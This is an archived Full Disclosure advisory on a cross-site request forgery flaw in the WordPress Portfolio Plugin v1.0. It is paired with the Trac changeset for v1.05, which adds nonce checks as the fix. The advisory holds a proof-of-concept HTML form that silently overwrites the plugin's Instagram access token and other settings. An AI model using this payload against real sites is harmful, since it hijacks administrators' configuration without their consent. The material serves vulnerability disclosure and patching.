=== Content from seclists.org_1a54a378_20250125_180254.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](103)
[By Date](date.html#104)
[![Next](/images/right-icon-16x16.png)](105)

[![Previous](/images/left-icon-16x16.png)](107)
[By Thread](index.html#104)
[![Next](/images/right-icon-16x16.png)](105)

![](/shared/images/nst-icons.svg#search)

# Cross-Site Request Forgery Vulnerability in Portfolio Plugin Wordpress Plugin v1.0

---

*From*: Nitin Venkatesh <venkatesh.nitin () gmail com>

*Date*: Mon, 20 Jul 2015 01:11:02 +0000

---

```
# Title: Cross-Site Request Forgery Vulnerability in Portfolio Plugin
Wordpress Plugin v1.0
# Submitter: Nitin Venkatesh
# Product: Portfolio Plugin Wordpress Plugin
# Product URL: <https://wordpress.org/plugins/portfolio-by-lisa-westlund/>
# Vulnerability Type: Cross-site Request Forgery [CWE-352]
# Affected Versions: v1.0
# Tested versions: v1.0
# Fixed Version: v1.05
# Link to code diff:
<https://plugins.trac.wordpress.org/changeset/1175403/portfolio-by-lisa-westlund>
# Changelog:
<https://plugins.trac.wordpress.org/log/portfolio-by-lisa-westlund>
# CVE Status: None/Unassigned/Fresh

## Product Information:

Use Instagram to display your portfolio. Choose whether to display all
images from your account, or only the ones you tag with a custom hashtag.

## Vulnerability Description:

The admin form in Portfolio Plugin v1.0 is susceptible to CSRF.

## Proof of Concept:

<form action="
<http://localhost/wp-admin/options-general.php?page=instagram-portfolio">;
method="post">
<input type="hidden" name="wplw_form_submitted" value='Y' />
<input type="hidden" name="wplw_instagram_access_token" value='evil-token1'
/>
<input type="hidden" name="wplw_instagram_userID" value='nitstorm' />
<input type="hidden" name="wplw_hashtag" value='csrf' />
<input type="hidden" name="wplw_settings_submit" value='Save' />
<input type="submit" value="submit" />
</form>

## Solution:

Upgrade to v1.05 or later.

## Disclosure Timeline:

2015-06-03 - Discovered. Mailed developer.
2015-06-05 - Updated v1.05 released.
2015-07-20 - Publishing disclosure on FD mailing list.

## Disclaimer:

This disclosure is purely meant for educational purposes. I will in no way
be responsible as to how the information in this disclosure is used.

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](103)
[By Date](date.html#104)
[![Next](/images/right-icon-16x16.png)](105)

[![Previous](/images/left-icon-16x16.png)](107)
[By Thread](index.html#104)
[![Next](/images/right-icon-16x16.png)](105)

### Current thread:

* **Cross-Site Request Forgery Vulnerability in Portfolio Plugin Wordpress Plugin v1.0** *Nitin Venkatesh (Jul 21)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from plugins.trac.wordpress.org_f28b54cf_20250125_180255.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%2F1175403%2Fportfolio-by-lisa-westlund)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Change](/changeset/1175401/portfolio-by-lisa-westlund "Changeset 1175401 for portfolio-by-lisa-westlund")
* [Next Change](/changeset/1175413/portfolio-by-lisa-westlund "Changeset 1175413 for portfolio-by-lisa-westlund") →

---

# Changeset [1175403](/changeset/1175403 "Show full changeset") for [portfolio-by-lisa-westlund](/browser/portfolio-by-lisa-westlund?rev=1175403 "Show entry in browser")

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
06/05/2015 03:40:09 PM
([10 years](/timeline?from=2015-06-05T15%3A40%3A09Z&precision=second "See timeline at 06/05/2015 03:40:09 PM") ago)

Author:
lisa\_westlund
Message:

Version 1.05 carries out a security bug-fix.

Location:
[portfolio-by-lisa-westlund/trunk](/browser/portfolio-by-lisa-westlund/trunk?rev=1175403)
Files:

3 edited

* [inc/options-page-wrapper.php](/browser/portfolio-by-lisa-westlund/trunk/inc/options-page-wrapper.php?rev=1175403 "Show entry in browser")
  (modified)
  ([1 diff](#file0 "Show differences"))
* [lisawestlund-instagram-portfolio.php](/browser/portfolio-by-lisa-westlund/trunk/lisawestlund-instagram-portfolio.php?rev=1175403 "Show entry in browser")
  (modified)
  ([3 diffs](#file1 "Show differences"))
* [readme.txt](/browser/portfolio-by-lisa-westlund/trunk/readme.txt?rev=1175403 "Show entry in browser")
  (modified)
  ([2 diffs](#file2 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [portfolio-by-lisa-westlund/trunk/inc/options-page-wrapper.php](/changeset/1175403/portfolio-by-lisa-westlund/trunk/inc/options-page-wrapper.php "Show the changeset 1175403 restricted to portfolio-by-lisa-westlund/trunk/inc/options-page-wrapper.php")

  | [r1172722](/browser/portfolio-by-lisa-westlund/trunk/inc/options-page-wrapper.php?rev=1172722#L54 "Show revision 1172722 of this file in browser") | [r1175403](/browser/portfolio-by-lisa-westlund/trunk/inc/options-page-wrapper.php?rev=1175403#L54 "Show revision 1175403 of this file in browser") |  |
  | --- | --- | --- |
  | 54 | 54 | </fieldset> |
  | 55 | 55 | <br> |
  |  | 56 | <?php wp\_nonce\_field( 'my\_wplw\_update\_check', 'wplw-update-check' ); ?> |
  | 56 | 57 | <input class="button-primary" type="submit" name="wplw\_settings\_submit" value="Save" /> |
  | 57 | 58 | </form> |
* ## [portfolio-by-lisa-westlund/trunk/lisawestlund-instagram-portfolio.php](/changeset/1175403/portfolio-by-lisa-westlund/trunk/lisawestlund-instagram-portfolio.php "Show the changeset 1175403 restricted to portfolio-by-lisa-westlund/trunk/lisawestlund-instagram-portfolio.php")

  | [r1172722](/browser/portfolio-by-lisa-westlund/trunk/lisawestlund-instagram-portfolio.php?rev=1172722#L51 "Show revision 1172722 of this file in browser") | [r1175403](/browser/portfolio-by-lisa-westlund/trunk/lisawestlund-instagram-portfolio.php?rev=1175403#L51 "Show revision 1175403 of this file in browser") |  |
  | --- | --- | --- |
  | 51 | 51 |  |
  | 52 | 52 | /\* Save form input data to $options array \*/ |
  |  | 53 |  |
  | 53 | 54 | if( isset( $\_POST['wplw\_form\_submitted'] ) ){ |
  | 54 |  | $hidden\_field = esc\_html($\_POST['wplw\_form\_submitted']); |
  | 55 |  |  |
  | 56 |  | if( $hidden\_field == 'Y' ){ |
  | 57 |  | $wplw\_instagram\_access\_token = esc\_html($\_POST['wplw\_instagram\_access\_token']); |
  | 58 |  | $wplw\_instagram\_userID = esc\_html($\_POST['wplw\_instagram\_userID']); |
  | 59 |  | $wplw\_hashtag = esc\_html($\_POST['wplw\_hashtag']); |
  | 60 |  |  |
  | 61 |  | if( isset($\_POST['wplw\_portfolio\_date']) ){ |
  | 62 |  | $wplw\_portfolio\_date = 'checked'; |
  | 63 |  | } |
  | 64 |  |  |
  | 65 |  | if( isset($\_POST['wplw\_portfolio\_description']) ){ |
  | 66 |  | $wplw\_portfolio\_description = 'checked'; |
  | 67 |  | } |
  | 68 |  |  |
  | 69 |  | $options = array( |
  | 70 |  | 'wplw\_instagram\_access\_token' => $wplw\_instagram\_access\_token, |
  | 71 |  | 'wplw\_instagram\_userID' => $wplw\_instagram\_userID, |
  | 72 |  | 'wplw\_hashtag' => $wplw\_hashtag, |
  | 73 |  | 'wplw\_portfolio\_date' => $wplw\_portfolio\_date, |
  | 74 |  | 'wplw\_portfolio\_description' => $wplw\_portfolio\_description |
  | 75 |  | ); |
  | 76 |  |  |
  | 77 |  | update\_option( 'wplw\_instagram\_portfolio', $options ); |
  | 78 |  | } |
  | 79 |  | } |
  | 80 |  |  |
  |  | 55 |  |
  |  | 56 | if ( ! isset( $\_POST['wplw-update-check'] ) || ! wp\_verify\_nonce( $\_POST['wplw-update-check'], 'my\_wplw\_update\_check' ) ) { |
  |  | 57 |  |
  |  | 58 | print 'Sorry, your nonce did not verify.'; |
  |  | 59 | exit; |
  |  | 60 |  |
  |  | 61 | } |
  |  | 62 |  |
  |  | 63 | else { |
  |  | 64 |  |
  |  | 65 | $hidden\_field = esc\_html($\_POST['wplw\_form\_submitted']); |
  |  | 66 |  |
  |  | 67 | if( $hidden\_field == 'Y' ){ |
  |  | 68 | $wplw\_instagram\_access\_token = esc\_html($\_POST['wplw\_instagram\_access\_token']); |
  |  | 69 | $wplw\_instagram\_userID = esc\_html($\_POST['wplw\_instagram\_userID']); |
  |  | 70 | $wplw\_hashtag = esc\_html($\_POST['wplw\_hashtag']); |
  |  | 71 |  |
  |  | 72 | if( isset($\_POST['wplw\_portfolio\_date']) ){ |
  |  | 73 | $wplw\_portfolio\_date = 'checked'; |
  |  | 74 | } |
  |  | 75 |  |
  |  | 76 | if( isset($\_POST['wplw\_portfolio\_description']) ){ |
  |  | 77 | $wplw\_portfolio\_description = 'checked'; |
  |  | 78 | } |
  |  | 79 |  |
  |  | 80 | $options = array( |
  |  | 81 | 'wplw\_instagram\_access\_token' => $wplw\_instagram\_access\_token, |
  |  | 82 | 'wplw\_instagram\_userID' => $wplw\_instagram\_userID, |
  |  | 83 | 'wplw\_hashtag' => $wplw\_hashtag, |
  |  | 84 | 'wplw\_portfolio\_date' => $wplw\_portfolio\_date, |
  |  | 85 | 'wplw\_portfolio\_description' => $wplw\_portfolio\_description |
  |  | 86 | ); |
  |  | 87 |  |
  |  | 88 | update\_option( 'wplw\_instagram\_portfolio', $options ); |
  |  | 89 | } |
  |  | 90 | } |
  |  | 91 | } |
  |  | 92 |  |
  | 81 | 93 | $options = get\_option( 'wplw\_instagram\_portfolio' ); |
  | 82 | 94 | if( $options != '' ){ |
  |  | 95 |  |
  | 83 | 96 | $wplw\_instagram\_access\_token = $options['wplw\_instagram\_access\_token']; |
  | 84 | 97 | $wplw\_instagram\_userID = $options['wplw\_instagram\_userID']; |
  | […](/browser/portfolio-by-lisa-westlund/trunk/lisawestlund-instagram-portfolio.php?rev=1172722#L87) | […](/browser/portfolio-by-lisa-westlund/trunk/lisawestlund-instagram-portfolio.php?rev=1175403#L100) |  |
  | 87 | 100 | $wplw\_portfolio\_description = $options['wplw\_portfolio\_description']; |
  | 88 | 101 | } |
  |  | 102 |  |
  | 89 | 103 | require( 'inc/options-page-wrapper.php' ); |
  | 90 | 104 | } |
  | […](/browser/portfolio-by-lisa-westlund/trunk/lisawestlund-instagram-portfolio.php?rev=1172722#L212) | […](/browser/portfolio-by-lisa-westlund/trunk/lisawestlund-instagram-portfolio.php?rev=1175403#L226) |  |
  | 212 | 226 | } |
  | 213 | 227 |  |
  | 214 |  | ?> |
  | 215 |  |  |
  | 216 |  |  |
  | 217 |  |  |
  | 218 |  |  |
  | 219 |  |  |
  | 220 |  |  |
  | 221 |  |  |
  | 222 |  |  |
  | 223 |  |  |
  | 224 |  |  |
  | 225 |  |  |
  | 226 |  |  |
  | 227 |  |  |
  | 228 |  |  |
  | 229 |  |  |
  | 230 |  |  |
  | 231 |  |  |
  |  | 228 | ?> |
* ## [portfolio-by-lisa-westlund/trunk/readme.txt](/changeset/1175403/portfolio-by-lisa-westlund/trunk/readme.txt "Show the changeset 1175403 restricted to portfolio-by-lisa-westlund/trunk/readme.txt")

  | [r1172722](/browser/portfolio-by-lisa-westlund/trunk/readme.txt?rev=1172722#L5 "Show revision 1172722 of this file in browser") | [r1175403](/browser/portfolio-by-lisa-westlund/trunk/readme.txt?rev=1175403#L5 "Show revision 1175403 of this file in browser") |  |
  | --- | --- | --- |
  | 5 | 5 | Requires at least: |
  | 6 | 6 | Tested up to: 4.2.2 |
  |  | 7 | Stable tag: 1.05 |
  | 7 | 8 | License: GPLv2 or later |
  | 8 | 9 | License URI: http://www.gnu.org/licenses/gpl-2.0.html |
  | […](/browser/portfolio-by-lisa-westlund/trunk/readme.txt?rev=1172722#L44) | […](/browser/portfolio-by-lisa-westlund/trunk/readme.txt?rev=1175403#L45) |  |
  | 44 | 45 |  |
  | 45 | 46 | == Changelog == |
  |  | 47 | = 1.05 = |
  |  | 48 | \* This update carries a security bug-fix. |
  |  | 49 |  |
  | 46 | 50 | = 1.0 = |
  | 47 | 51 | \* This is the first version of the plugin. |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=1175403)
* [Zip Archive](?format=zip&new=1175403)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


